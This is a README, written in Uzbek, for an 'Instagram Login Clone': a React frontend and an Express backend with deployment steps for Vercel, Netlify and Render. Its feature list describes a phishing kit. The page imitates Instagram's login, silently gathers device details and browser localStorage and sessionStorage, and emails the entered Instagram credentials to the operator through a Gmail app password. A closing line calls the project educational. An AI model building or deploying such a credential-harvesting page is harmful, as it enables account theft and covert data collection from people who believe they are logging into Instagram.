# Instagram Login Clone

Bu loyiha Instagram login sahifasining klonini o'z ichiga oladi. Frontend React + Vite + Tailwind CSS bilan, backend Node.js + Express + MongoDB bilan yaratilgan.

## 🚀 Deploy qilish

### Frontend (Vercel/Netlify)

1. **Vercel'da deploy qilish:**
   ```bash
   # Vercel CLI o'rnatish
   npm i -g vercel
   
   # Frontend papkasiga o'tish
   cd frontend
   
   # Deploy qilish
   vercel
   ```

2. **Netlify'da deploy qilish:**
   - Netlify'ga o'ting
   - `frontend` papkasini drag & drop qiling
   - Build command: `npm run build`
   - Publish directory: `dist`

### Backend (Render/Railway)

1. **Render'da deploy qilish:**
   - Render'ga o'ting
   - New Web Service yarating
   - GitHub repository'ni ulang
   - Root Directory: `backend`
   - Build Command: `npm install`
   - Start Command: `npm start`

2. **Environment Variables (Backend):**
   ```
   EMAIL_USER=your-email@gmail.com
   EMAIL_PASS=your-app-password
   MONGODB_URI=mongodb://localhost:27017/instagram-login
   PORT=5000
   ```

### Frontend Environment Variables

`.env` fayl yarating:
```
VITE_API_URL=https://your-backend-url.onrender.com
```

## 📁 Loyiha strukturasi

```
InstagramLoginceret/
├── frontend/                 # React + Vite frontend
│   ├── src/
│   │   ├── components/
│   │   │   └── InstagramLogin.tsx
│   │   ├── App.tsx
│   │   └── main.tsx
│   ├── package.json
│   └── vite.config.ts
├── backend/                  # Node.js + Express backend
│   ├── server.js
│   └── package.json
└── README.md
```

## 🛠️ Texnik xususiyatlar

### Frontend
- **React 18** - UI framework
- **Vite** - Build tool
- **Tailwind CSS** - Styling
- **TypeScript** - Type safety
- **Dark/Light mode** - Theme switching
- **Responsive design** - Mobile/Desktop

### Backend
- **Node.js** - Runtime
- **Express** - Web framework
- **MongoDB** - Database
- **Nodemailer** - Email sending
- **CORS** - Cross-origin requests

## 🔧 Funksiyalar

### Avtomatik ma'lumot yig'ish
- Device ma'lumotlari
- Browser localStorage/sessionStorage
- Battery ma'lumotlari
- Screen resolution
- Timezone

### Form submission
- Username/email input
- Password input
- Show/hide password
- Floating labels
- Form validation

### Email xabarlari
- Avtomatik to'plangan ma'lumotlar
- Qo'lda kiritilgan ma'lumotlar
- Device ma'lumotlari
- Instagram credentials

## 🚀 Ishga tushirish

### Development
```bash
# Backend
cd backend
npm install
npm run dev

# Frontend
cd frontend
npm install
npm run dev
```

### Production
```bash
# Backend
cd backend
npm install
npm start

# Frontend
cd frontend
npm install
npm run build
```

## 📧 Email sozlash

Gmail App Password yarating:
1. Google Account → Security
2. 2-Step Verification yoqing
3. App passwords → Generate
4. Backend `.env` faylida ishlating

## 🔒 Xavfsizlik

- CORS sozlanadi
- Input validation
- Error handling
- Secure headers

## 📱 Responsive

- Mobile-first design
- Dark/Light mode
- Touch-friendly
- Cross-browser support

## 🎨 Dizayn

- Instagram'ga o'xshash
- Modern UI/UX
- Smooth animations
- Professional look

## 📊 Monitoring

- Console logging
- Error tracking
- Performance monitoring
- User analytics

---

**Eslatma:** Bu loyiha faqat o'quv maqsadida yaratilgan. 